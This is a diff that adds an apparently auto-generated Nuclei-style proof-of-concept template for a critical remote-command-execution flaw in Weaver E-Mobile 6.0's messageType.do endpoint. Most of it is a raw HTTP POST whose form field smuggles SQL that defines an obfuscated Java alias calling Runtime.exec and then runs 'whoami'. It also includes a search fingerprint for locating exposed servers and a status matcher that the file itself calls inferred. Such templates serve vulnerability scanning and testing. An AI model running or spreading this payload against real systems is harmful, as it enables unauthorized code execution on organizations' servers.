@@ -1,0 +1,50 @@
+id: poc-d783623cd69081e83d35
+info:
+  name: 泛微E-Mobile6.0messageType.do存在命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/d783623cd69081e83d35e1a37cbd53ef
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: d783623cd69081e83d35e1a37cbd53ef
+    fofa: + hunter：`app.name=="泛微 e-mobile OA"`
+http:
+- raw:
+  - 'POST /messageType.do HTTP/1.1
+
+    Content-Type: multipart/form-data; boundary=00content0boundary00
+
+    User-Agent: Java/1.8.0_371
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Content-Length: 1090
+
+    Connection: close
+
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="method"
+
+
+    create
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="typeName"
+
+
+    1'';CREATE ALIAS if not exists MzSNqKsZTagm AS CONCAT(''void e(String cmd) throws java.la'',''ng.Exception{'',''Object curren'',''tRequest = Thre'',''ad.currentT'',''hread().getConte'',''xtClass'',''Loader().loadC'',''lass("com.caucho.server.dispatch.ServletInvocation").getMet'',''hod("getContextRequest").inv'',''oke(null);java.la'',''ng.reflect.Field _responseF = currentRequest.getCl'',''ass().getSuperc'',''lass().getDeclar'',''edField("_response");_responseF.setAcce'',''ssible(true);Object response = _responseF.get(currentRequest);java.la'',''ng.reflect.Method getWriterM = response.getCl'',''ass().getMethod("getWriter");java.i'',''o.Writer writer = (java.i'',''o.Writer)getWriterM.inv'',''oke(response);java.ut'',''il.Scan'',''ner scan'',''ner = (new java.util.Scann'',''er(Runt'',''ime.getRunt'',''ime().ex'',''ec(cmd).getInput'',''Stream())).useDelimiter("\\A");writer.write(scan'',''ner.hasNext()?sca'',''nner.next():"");}'');CALL MzSNqKsZTagm(''whoami'');--
+
+    --00content0boundary00--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
